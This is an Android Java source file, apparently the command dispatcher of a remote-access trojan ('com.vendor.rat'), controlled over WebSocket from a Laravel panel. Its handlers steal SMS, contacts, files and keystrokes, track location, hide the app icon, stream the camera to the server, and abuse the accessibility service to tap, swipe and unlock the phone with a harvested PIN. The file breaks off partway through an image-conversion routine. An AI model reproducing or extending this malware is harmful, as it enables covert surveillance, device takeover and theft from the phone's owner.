package com.vendor.rat.control.handler;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.graphics.Path;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.engine.ConfirmLockDelegate;
import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.CommandHandler;
import com.vendor.rat.service.MyAccessibilityService;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * 指令分发器 (唯一的 WebSocket CommandListener)
 *
 * 路由逻辑:
 *   type="screencomd" → dispatchScreenCommand (Laravel PanelSendHandler 命令)
 *   type="engine"     → CommandHandler (引擎控制命令)
 *   type=数字         → 旧格式兼容 (本地 HttpCommandServer)
 */
public class CommandDispatcher implements WebSocketClient.CommandListener {

    private static final String TAG = "CommandDispatcher";

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;
    private ShellCommandHandler shellCommandHandler;
    private FileTransferHandler fileTransferHandler;
    private KeylogHandler keylogHandler;
    private CommandHandler engineHandler;

    public CommandDispatcher() {
        screenshotHandler = new ScreenshotHandler();
        audioRecordHandler = new AudioRecordHandler();
        shellCommandHandler = new ShellCommandHandler();
        fileTransferHandler = new FileTransferHandler();
        keylogHandler = new KeylogHandler();
    }

    /**
     * 注册到 WebSocket 客户端 (唯一入口)
     */
    public void register() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null) {
            wsClient.setCommandListener(this);
        }
    }

    /**
     * 设置引擎命令处理器 (委托给 CommandHandler)
     */
    public void setEngineHandler(CommandHandler handler) {
        this.engineHandler = handler;
    }

    public KeylogHandler getKeylogHandler() {
        return keylogHandler;
    }

    @Override
    public void onCommand(String type, String subc, JsonObject json) {
        try {
            // Laravel PanelSendHandler 下发: type="screencomd", subc="Screen/SMS/..."
            if ("screencomd".equals(type)) {
                dispatchScreenCommand(subc, json);
                return;
            }

            // Laravel PanelHandler 下发: type="screen", subc="nav/mov/paste/block/..."
            if ("screen".equals(type)) {
                dispatchScreenAction(subc, json);
                return;
            }

            // Laravel PanelHandler: type="mic", subc="ON/OFF"
            if ("mic".equals(type)) {
                if ("ON".equals(subc)) {
                    handleMicStart();
                } else {
                    handleMicStop();
                }
                return;
            }

            // 兼容旧数字 type 格式 (来自本地 HttpCommandServer)
            if (json.has("type") && json.get("type").isJsonPrimitive()) {
                try {
                    int numType = json.get("type").getAsInt();
                    switch (numType) {
                        case 10: screenshotHandler.handle(json); break;
                        case 11: audioRecordHandler.handle(json); break;
                        case 12: // fall through
                        case 13: fileTransferHandler.handle(json); break;
                        case 14: shellCommandHandler.handle(json); break;
                        default:
                            Log.w(TAG, "Unknown numeric command type: " + numType);
                    }
                    return;
                } catch (NumberFormatException ignored) {
                    // type is string, not number — fall through
                }
            }

            // 引擎控制命令 → 委托给 CommandHandler
            if ("engine".equals(type) || (json.has("cmd") && !json.get("cmd").getAsString().isEmpty())) {
                if (engineHandler != null) {
                    engineHandler.onCommand(type, subc, json);
                }
                return;
            }

            Log.w(TAG, "Unhandled command: type=" + type + ", subc=" + subc);
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch command", e);
        }
    }

    /**
     * 分发 Laravel screencomd 命令
     * 对齐 PanelSendHandler 的 30+ 个命令
     */
    private void dispatchScreenCommand(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screencomd with null subc");
            return;
        }
        Log.d(TAG, "screencomd: subc=" + subc);

        switch (subc) {
            // 投屏/截图
            case "Screen":      screenshotHandler.handle(payload); break;
            case "out":         screenshotHandler.handle(payload); break;

            // 短信
            case "SMS":         handleFetchSms(); break;
            case "SMSSEND":     handleSendSms(payload); break;

            // 联系人
            case "Contacts":    handleFetchContacts(); break;

            // 文件
            case "files":       handleFetchFiles(payload); break;
            case "viewfile":    handleViewFile(payload); break;
            case "gallery":     handleGallery(payload); break;
            case "changefiles": handleChangeFiles(payload); break;

            // 应用
            case "LOADAPPS":    handleLoadApps(); break;
            case "OPENAPP":     handleOpenApp(payload); break;
            case "UNINSTALLAPP":handleUninstallApp(payload); break;

            // 键盘记录
            case "Keylog":      handleKeylog(payload); break;
            case "Logdate":     handleLogdate(payload); break;

            // 定位
            case "Location":    handleStartLocation(); break;
            case "Locationoff": handleStopLocation(); break;

            // 相机
            case "Camera":      handleCamera(payload); break;
            case "CameraOff":   handleCameraOff(); break;

            // 隐藏图标
            case "Hideico":     handleHideIcon(); break;

            // 重命名
            case "Rename":      handleRename(payload); break;

            // 弹窗
            case "DIAO":        Log.d(TAG, "Dialog: " + payload); break;

            // 文件搜索
            case "srch":        handleFileSearch(payload); break;

            // 文件复制
            case "cocu":        Log.d(TAG, "Copy: " + payload); break;

            // 聊天
            case "chat":        Log.d(TAG, "Chat: " + payload); break;

            // 获取文件
            case "fetch":       handleFetchFiles(payload); break;

            // 显示控制
            case "display":     Log.d(TAG, "Display: " + payload); break;

            default:
                Log.d(TAG, "screencomd not yet handled: " + subc);
        }
    }

    /**
     * 分发 Laravel PanelHandler screen 操作命令
     * 对齐 PanelHandler.handleScreenCommand() 的 type="screen" 命令
     *
     * 格式: {"type":"screen", "subc":"nav/mov/paste/block/...", ...fields}
     */
    private void dispatchScreenAction(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screen action with null subc");
            return;
        }
        Log.d(TAG, "screen action: subc=" + subc);

        switch (subc) {
            case "nav":
                handleNav(payload);
                break;
            case "mov":
                handleMov(payload);
                break;
            case "snap":
                handleSnap(payload);
                break;
            case "paste":
                handlePaste(payload);
                break;
            case "block":
                Log.d(TAG, "block: " + payload.toString());
                // TODO: 黑屏遮罩 (需要 WindowManager overlay)
                break;
            case "vol":
                handleVolume(payload);
                break;
            case "kb":
                Log.d(TAG, "keyboard: " + payload.toString());
                // TODO: 键盘显示/隐藏控制
                break;
            case "L":
                handleLock(payload);
                break;
            case "Q":
                handleQuality(payload);
                break;
            case "out":
                screenshotHandler.handle(payload);
                break;
            default:
                Log.d(TAG, "screen action not yet handled: " + subc);
        }
    }

    /**
     * 导航
     * "ho" → HOME, "bak" → 返回, "rec" → 多任务
     */
    private void handleNav(JsonObject payload) {
        String nav = ScreenActionParser.getNav(payload);
        NavAction action = NavAction.fromShortcut(nav);
        Log.d(TAG, "nav: " + nav + " → " + action);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "nav: AccessibilityService not available");
            return;
        }

        switch (action) {
            case HOME:
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case BACK:
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case RECENTS:
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            default:
                Log.w(TAG, "nav: unknown nav=" + nav);
        }
    }

    /**
     * 点亮屏幕 (不是 HOME)
     */
    private void wakeScreen() {
        try {
            Context ctx = getAppContext();
            if (ctx == null) return;
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE,
                    "vendor:wakescreen");
                wl.acquire(3000);
                wl.release();
                Log.d(TAG, "wakeScreen: screen turned on");
            }
        } catch (Exception e) {
            Log.w(TAG, "wakeScreen failed", e);
        }
    }

    /**
     * 触摸/滑动操作
     * movetype: "0"=点击, "1"=滑动, "2"=长按
     *
     * 点击/长按: poi = {"x":100,"y":200} (JSON 对象)
     * 滑动:     poi = "(x1,y1):(x2,y2)" (字符串)
     */
    private void handleMov(JsonObject payload) {
        String movetype = payload.has("movetype") ? payload.get("movetype").getAsString() : "";
        Log.d(TAG, "mov: movetype=" + movetype);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "mov: AccessibilityService not available");
            return;
        }

        switch (movetype) {
            case "0": // 点击
                handleTap(service, payload);
                break;
            case "1": // 滑动
                handleSwipe(service, payload);
                break;
            case "2": // 长按
                handleLongPress(service, payload);
                break;
            default:
                Log.w(TAG, "mov: unknown movetype=" + movetype);
        }
    }

    private void handleTap(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "tap: x=" + coords[0] + ", y=" + coords[1]);
    }

    private void handleSwipe(AccessibilityService service, JsonObject payload) {
        // poi 格式: "(x1,y1):(x2,y2)" 或 "(x1,y1):(x2,y2):(x3,y3)"
        String poi = "";
        if (payload.has("poi")) {
            poi = payload.get("poi").isJsonPrimitive()
                ? payload.get("poi").getAsString()
                : payload.get("poi").toString();
        }

        // 解析 (x,y):(x,y) 格式
        String[] points = poi.split(":");
        if (points.length < 2) {
            Log.w(TAG, "swipe: invalid poi=" + poi);
            return;
        }

        int[] start = parsePoint(points[0]);
        int[] end = parsePoint(points[points.length - 1]);
        if (start == null || end == null) return;

        Path path = new Path();
        path.moveTo(start[0], start[1]);
        path.lineTo(end[0], end[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "swipe: " + start[0] + "," + start[1] + " → " + end[0] + "," + end[1]);
    }

    private void handleLongPress(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 1000))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "longpress: x=" + coords[0] + ", y=" + coords[1]);
    }

    /**
     * 解析 poi JSON 对象 {"x":100,"y":200}
     */
    private int[] parsePoiObject(JsonObject payload) {
        try {
            if (payload.has("poi") && payload.get("poi").isJsonObject()) {
                JsonObject poi = payload.getAsJsonObject("poi");
                int x = poi.get("x").getAsInt();
                int y = poi.get("y").getAsInt();
                return new int[]{x, y};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoiObject failed", e);
        }
        return null;
    }

    /**
     * 解析 "(x,y)" 格式的坐标字符串
     */
    private int[] parsePoint(String point) {
        try {
            String clean = point.replaceAll("[()]", "").trim();
            String[] parts = clean.split(",");
            if (parts.length >= 2) {
                return new int[]{Integer.parseInt(parts[0].trim()), Integer.parseInt(parts[1].trim())};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoint failed: " + point, e);
        }
        return null;
    }

    /**
     * 截图 (单次)
     * 格式: {"type":"screen", "subc":"snap", "snaptype":"1"}
     */
    private void handleSnap(JsonObject payload) {
        // 复用 screenshotHandler，构造 SM 命令
        JsonObject cmd = new JsonObject();
        cmd.addProperty("comdtype", "SM");
        screenshotHandler.handle(cmd);
    }

    /**
     * 粘贴文本到当前焦点
     * 格式: {"type":"screen", "subc":"paste", "txt":"hello"}
     */
    private void handlePaste(JsonObject payload) {
        String txt = payload.has("txt") ? payload.get("txt").getAsString() : "";
        Log.d(TAG, "paste: length=" + txt.length());

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null || txt.isEmpty()) return;

        // 设置剪贴板
        ClipboardManager clipboard = (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText("paste", txt));
        }

        // 通过无障碍服务粘贴到当前焦点节点
        android.view.accessibility.AccessibilityNodeInfo focus = service.findFocus(
            android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null) {
            Bundle args = new Bundle();
            args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, txt);
            focus.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            focus.recycle();
            Log.d(TAG, "paste: text set via ACTION_SET_TEXT");
        } else {
            Log.w(TAG, "paste: no input focus found, text copied to clipboard");
        }
    }

    /**
     * 音量控制
     * volstate=0 → 增加音量, volstate=1 → 减少音量
     */
    private void handleVolume(JsonObject payload) {
        String volstate = ScreenActionParser.getVolstate(payload);
        VolumeAction action = VolumeAction.fromState(volstate);
        Log.d(TAG, "volume: volstate=" + volstate + " → " + action);

        try {
            Context ctx = getAppContext();
            if (ctx == null) return;

            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;

            switch (action) {
                case UP:
                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
                    break;
                case DOWN:
                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
                    break;
                case MUTE:
                    // 将所有音量流设为 0 (不用 setRingerMode，避免需要勿扰权限)
                    am.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);
                    am.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
                    am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
                    am.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
                    Log.d(TAG, "volume: muted (all streams set to 0)");
                    break;
                case UNMUTE:
                    int maxMusic = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                    int maxRing = am.getStreamMaxVolume(AudioManager.STREAM_RING);
                    am.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic / 2, AudioManager.FLAG_SHOW_UI);
                    am.setStreamVolume(AudioManager.STREAM_RING, maxRing / 2, 0);
                    am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, maxRing / 2, 0);
                    Log.d(TAG, "volume: unmuted (music=" + (maxMusic / 2) + ", ring=" + (maxRing / 2) + ")");
                    break;
                default:
                    Log.w(TAG, "volume: unknown action");
            }
        } catch (Exception e) {
            Log.w(TAG, "volume control failed", e);
        }
    }

    /**
     * 锁屏/解锁控制
     * lock=1 → 锁屏
     * lock=0 → 解锁: 判断屏幕状态和密码
     *   - 无锁屏 → 不操作
     *   - 有锁屏无密码 → 唤醒屏幕 + 上滑
     *   - 有锁屏有密码 → 唤醒屏幕 + 上滑 + 模拟输入密码
     */
    private void handleLock(JsonObject payload) {
        String lock = ScreenActionParser.getLock(payload);
        LockAction action = LockAction.fromState(lock);
        Log.d(TAG, "lock: " + lock + " → " + action);

        switch (action) {
            case LOCK:
                // 直接锁屏，不经过 HOME
                try {
                    Context lockCtx = getAppContext();
                    if (lockCtx != null) {
                        android.app.admin.DevicePolicyManager dpm =
                            (android.app.admin.DevicePolicyManager) lockCtx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                        if (dpm != null && dpm.isAdminActive(
                                new android.content.ComponentName(lockCtx, "com.vendor.rat.service.AppDeviceAdminReceiver"))) {
                            dpm.lockNow();
                            Log.d(TAG, "lock: locked via DevicePolicyManager");
                        } else {
                            // 备选: AccessibilityService LOCK_SCREEN (API 28+)
                            MyAccessibilityService lockService = MyAccessibilityService.P();
                            if (lockService != null) {
                                lockService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                                Log.d(TAG, "lock: locked via AccessibilityService");
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.w(TAG, "lock failed", e);
                }
                break;
            case UNLOCK:
                handleUnlock();
                break;
            default:
                Log.w(TAG, "lock: unknown action");
        }
    }

    private void handleUnlock() {
        Context ctx = getAppContext();
        if (ctx == null) return;

        KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
        android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);

        boolean screenOn = pm != null && pm.isInteractive();
        boolean locked = km != null && km.isKeyguardLocked();
        boolean hasPassword = km != null && km.isDeviceSecure();

        Log.d(TAG, "unlock: screenOn=" + screenOn + ", locked=" + locked + ", hasPassword=" + hasPassword);

        if (!locked && screenOn) {
            Log.d(TAG, "unlock: screen already unlocked, no action");
            return;
        }

        // 1. 双保险亮屏: WakeLock + WakeActivity
        //    WakeLock 立即唤醒，WakeActivity 的 FLAG_KEEP_SCREEN_ON 保持
        wakeScreen();

        Context wakeCtx = ctx;
        Intent wakeIntent = new Intent(wakeCtx, com.vendor.rat.activity.WakeActivity.class);
        wakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        wakeCtx.startActivity(wakeIntent);
        Log.d(TAG, "unlock: WakeActivity + WakeLock launched");

        if (!locked) {
            Log.d(TAG, "unlock: no lock screen, just woke up");
            return;
        }

        // 2. 在单一线程中串行执行整个解锁流程
        new Thread(() -> {
            try {
                Thread.sleep(2000); // 等屏幕完全亮起

                // WakeActivity 已完成亮屏使命，关掉它让锁屏界面露出来
                com.vendor.rat.activity.WakeActivity.finishIfAlive();
                Thread.sleep(500);

                MyAccessibilityService service = MyAccessibilityService.P();
                if (service == null) return;

                if (hasPassword) {
                    String password = getStoredPassword();
                    if (password == null || password.isEmpty()) {
                        Log.w(TAG, "unlock: no stored password, swipe only");
                        swipeUp(service);
                    } else {

                    // 上滑触发 PIN 界面
                    swipeUp(service);
                    Thread.sleep(2000); // 等 PIN 界面渲染

                    // 获取真实屏幕尺寸（包含导航栏）
                    android.graphics.Point realSize = new android.graphics.Point();
                    android.view.WindowManager wm = (android.view.WindowManager)
                            service.getSystemService(android.content.Context.WINDOW_SERVICE);
                    if (wm != null) {
                        wm.getDefaultDisplay().getRealSize(realSize);
                    }
                    int w = realSize.x > 0 ? realSize.x : service.getResources().getDisplayMetrics().widthPixels;
                    int h = realSize.y > 0 ? realSize.y : service.getResources().getDisplayMetrics().heightPixels;

                    // 一劳永逸: 尝试动态获取 PIN 按钮真实坐标
                    int[][] digitCoords = tryGetPinButtonCoords(service);
                    if (digitCoords != null) {
                        Log.d(TAG, "unlock: using dynamic PIN coords from accessibility");
                    } else {
                        // fallback: 厂商比例坐标
                        digitCoords = calcPinCoordsFromRatio(w, h);
                        Log.d(TAG, "unlock: using vendor ratio coords, screen=" + w + "x" + h);
                    }

                    Log.d(TAG, "unlock: starting PIN input (" + password.length() + " digits)");
                    for (int i = 0; i < password.length(); i++) {
                        int digit = password.charAt(i) - '0';
                        int px = digitCoords[digit][0];
                        int py = digitCoords[digit][1];

                        android.graphics.Path path = new android.graphics.Path();
                        path.moveTo(px, py);
                        GestureDescription gesture = new GestureDescription.Builder()
                                .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
                                .build();
                        service.dispatchGesture(gesture, null, null);
                        Log.d(TAG, "unlock: tapped digit " + password.charAt(i) + " at (" + px + "," + py + ")");
                        Thread.sleep(350);
                    }
                    Log.d(TAG, "unlock: PIN input complete");
                    } // end else (password available)
                } else {
                    swipeUp(service);
                }
            } catch (Exception e) {
                Log.w(TAG, "unlock failed", e);
            }
        }).start();
    }

    /**
     * 获取存储的锁屏密码
     * 优先级: LockCredentialStore (PIN 采集加密存储) > device_config (Panel 下发)
     */
    private String getStoredPassword() {
        // 1. LockCredentialStore (PIN 采集页面保存的加密 PIN)
        String pin = LockCredentialStore.getPin();
        if (pin != null && !pin.isEmpty()) return pin;

        // 2. device_config (Panel 通过 phonepass 命令设置)
        try {
            Context ctx = getAppContext();
            if (ctx != null) {
                String pwd = ctx.getSharedPreferences("device_config", Context.MODE_PRIVATE)
                    .getString("lock_password", "");
                if (!pwd.isEmpty()) return pwd;
            }
        } catch (Exception e) {
            Log.w(TAG, "getStoredPassword failed", e);
        }
        return null;
    }

    private void ensureConfirmLockDelegate(MyAccessibilityService service) {
        try {
            com.vendor.rat.service.EngineManager mgr = service.getEngineManager();
            if (mgr != null && !mgr.hasEngine(ConfirmLockDelegate.class)) {
                mgr.register(new ConfirmLockDelegate());
                Log.d(TAG, "unlock: ConfirmLockDelegate registered");
            }
        } catch (Exception e) {
            Log.w(TAG, "ensureConfirmLockDelegate failed", e);
        }
    }

    /**
     * 动态获取 PIN 按钮坐标 — 遍历所有无障碍窗口找 digit 按钮
     * 返回 int[10][2] (digit 0-9 的 center x,y)，找不到返回 null
     */
    private int[][] tryGetPinButtonCoords(MyAccessibilityService service) {
        try {
            // 搜索策略: content-desc="0"-"9" 或 resource-id key0-key9
            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = service.getWindows();
            if (windows == null) return null;

            for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
                if (w == null) continue;
                android.view.accessibility.AccessibilityNodeInfo root = w.getRoot();
                if (root == null) continue;

                int[][] coords = extractDigitCoords(root);
                if (coords != null) return coords;
            }

            // fallback: activeRoot
            android.view.accessibility.AccessibilityNodeInfo active = service.getRootInActiveWindow();
            if (active != null) {
                int[][] coords = extractDigitCoords(active);
                if (coords != null) return coords;
            }
        } catch (Exception e) {
            Log.w(TAG, "tryGetPinButtonCoords error", e);
        }
        return null;
    }

    private int[][] extractDigitCoords(android.view.accessibility.AccessibilityNodeInfo root) {
        int[][] coords = new int[10][2];
        int found = 0;

        for (int d = 0; d <= 9; d++) {
            String ds = String.valueOf(d);
            // 方式1: content-desc 匹配
            java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes =
                    root.findAccessibilityNodeInfosByText(ds);
            for (android.view.accessibility.AccessibilityNodeInfo n : nodes) {
                CharSequence desc = n.getContentDescription();
                if (desc != null && desc.toString().equals(ds) && n.isClickable()) {
                    android.graphics.Rect bounds = new android.graphics.Rect();
                    n.getBoundsInScreen(bounds);
                    coords[d][0] = bounds.centerX();
                    coords[d][1] = bounds.centerY();
                    found++;
                    Log.d(TAG, "PIN coord: digit " + d + " at (" + coords[d][0] + "," + coords[d][1] + ")");
                    break;
                }
            }
        }

        if (found >= 10) {
            Log.d(TAG, "extractDigitCoords: found all 10 digits");
            return coords;
        }
        Log.d(TAG, "extractDigitCoords: only found " + found + "/10 digits");
        return null;
    }

    /**
     * 厂商比例坐标 fallback
     */
    private int[][] calcPinCoordsFromRatio(int w, int h) {
        float[] colX, rowY;
        if (com.vendor.rat.utils.DeviceUtils.isXiaomi()) {
            colX = new float[]{0.236f, 0.499f, 0.763f};
            rowY = new float[]{0.562f, 0.639f, 0.716f, 0.794f};
        } else if (com.vendor.rat.utils.DeviceUtils.isHuawei()) {
            colX = new float[]{0.246f, 0.500f, 0.754f};
            rowY = new float[]{0.500f, 0.600f, 0.700f, 0.800f};
        } else {
            colX = new float[]{0.246f, 0.500f, 0.754f};
            rowY = new float[]{0.471f, 0.580f, 0.688f, 0.797f};
        }

        int[][] coords = new int[10][2];
        // digits 1-9
        for (int d = 1; d <= 9; d++) {
            int idx = d - 1;
            coords[d][0] = (int) (colX[idx % 3] * w);
            coords[d][1] = (int) (rowY[idx / 3] * h);
        }
        // digit 0
        coords[0][0] = (int) (colX[1] * w);
        coords[0][1] = (int) (rowY[3] * h);
        return coords;
    }

    private void swipeUp(MyAccessibilityService service) {
        int w = service.getResources().getDisplayMetrics().widthPixels;
        int h = service.getResources().getDisplayMetrics().heightPixels;
        Path swipePath = new Path();
        swipePath.moveTo(w / 2f, h * 0.8f);
        swipePath.lineTo(w / 2f, h * 0.2f);
        GestureDescription swipe = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300))
                .build();
        service.dispatchGesture(swipe, null, null);
        Log.d(TAG, "unlock: swipe up dispatched");
    }

    /**
     * 投屏画质调整
     * 格式: {"type":"screen", "subc":"Q", "newq":"30"}
     */
    private void handleQuality(JsonObject payload) {
        String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
        Log.d(TAG, "quality: " + newq);
    }

    // ============ 摄像头 ============

    private CameraDevice cameraDevice;
    private CameraCaptureSession cameraSession;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private ImageReader cameraReader;
    private volatile boolean cameraStreaming = false;
    private volatile long lastCameraFrameTime = 0;
    private static final long CAMERA_FRAME_INTERVAL_MS = 200; // 每 200ms 发一帧 (~5fps)

    /**
     * 开启摄像头实时预览流
     * 使用 TEMPLATE_PREVIEW + setRepeatingRequest 连续预览
     * ImageReader 回调中控制发送频率 (500ms/帧)
     */
    private void handleCamera(JsonObject payload) {
        String selectedCam = ScreenActionParser.getString(payload, "SelectedCam", "back");
        Log.d(TAG, "Camera: " + selectedCam);

        handleCameraOff();

        Context ctx = getAppContext();
        if (ctx == null) return;

        cameraStreaming = true;

        new Thread(() -> {
            try {
                CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
                if (cm == null) return;

                String cameraId = "0";
                for (String id : cm.getCameraIdList()) {
                    CameraCharacteristics chars = cm.getCameraCharacteristics(id);
                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                    if ("front".equals(selectedCam) && facing != null
                            && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        cameraId = id; break;
                    } else if ("back".equals(selectedCam) && facing != null
                            && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        cameraId = id; break;
                    }
                }

                cameraThread = new HandlerThread("camera-thread");
                cameraThread.start();
                cameraHandler = new Handler(cameraThread.getLooper());

                // YUV 格式预览，比 JPEG 快得多
                cameraReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2);
                cameraReader.setOnImageAvailableListener(r -> {
                    Image image = r.acquireLatestImage();
                    if (image == null) return;

                    try {
                        long now = System.currentTimeMillis();
                        if (!cameraStreaming || now - lastCameraFrameTime < CAMERA_FRAME_INTERVAL_MS) {
                            image.close();
                            return;
                        }
                        lastCameraFrameTime = now;

                        // YUV → JPEG 压缩
                        byte[] jpegBytes = yuvToJpeg(image, 30);
                        image.close();

                        if (jpegBytes != null) {
                            WebSocketClient ws = getWsClient();
                            if (ws != null) {
                                ws.sendCamera(Base64.encodeToString(jpegBytes, Base64.NO_WRAP));
                            }
                        }
                    } catch (Exception e) {
                        image.close();
                    }
                }, cameraHandler);

                final String fCameraId = cameraId;
                cm.openCamera(fCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        cameraDevice = camera;
                        try {
                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                            builder.addTarget(cameraReader.getSurface());

                            camera.createCaptureSession(
                                java.util.Collections.singletonList(cameraReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        cameraSession = session;
                                        try {
                                            session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                            Log.d(TAG, "Camera preview streaming started");
                                        } catch (CameraAccessException e) {
                                            Log.e(TAG, "setRepeatingRequest failed", e);
                                        }
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {
                                        Log.e(TAG, "Camera session config failed");
                                    }
                                }, cameraHandler);
                        } catch (CameraAccessException e) {
                            Log.e(TAG, "Camera session create failed", e);
                        }
                    }
                    @Override
                    public void onDisconnected(CameraDevice camera) { camera.close(); }
                    @Override
                    public void onError(CameraDevice camera, int error) {
                        Log.e(TAG, "Camera error: " + error);
                        camera.close();
                    }
                }, cameraHandler);

            } catch (Exception e) {
                Log.e(TAG, "handleCamera failed", e);
            }
        }).start();
    }

    /**
     * YUV_420_888 → JPEG 压缩
     */
    private byte[] yuvToJpeg(Image image, int quality) {
        try {
            android.graphics.YuvImage yuvImage = new android.graphics.YuvImage(
                imageToNv21(image),
                android.graphics.ImageFormat.NV21,
                image.getWidth(), image.getHeight(), null);
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            yuvImage.compressToJpeg(
                new android.graphics.Rect(0, 0, image.getWidth(), image.getHeight()),
                quality, baos);
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Image YUV_420_888 → NV21 byte[]
     */
    private byte[] imageToNv21(Image image) {
        Image.Plane[] planes = image.getPlanes();
        int w = image.getWidth();
        int h = image.getHeight();
        byte[] nv21 = new byte[w * h * 3 / 2];

        // Y plane
        java.nio.ByteBuffer yBuffer = planes[0].getBuffer();
        int yRowStride = planes[0].getRowStride();
        for (int row = 0; row < h; row++) {
            yBuffer.position(row * yRowStride);
            yBuffer.get(nv21, row * w, w);
        }

        // VU interleaved
        java.nio.ByteBuffer uBuffer = planes[1].getBuffer();
        java.nio.ByteBuffer vBuffer = planes[2].getBuffer();
        int uvRowStride = planes[1].getRowStride();
        int uvPixelStride = planes[1].getPixelStride();
        int offset = w * h;
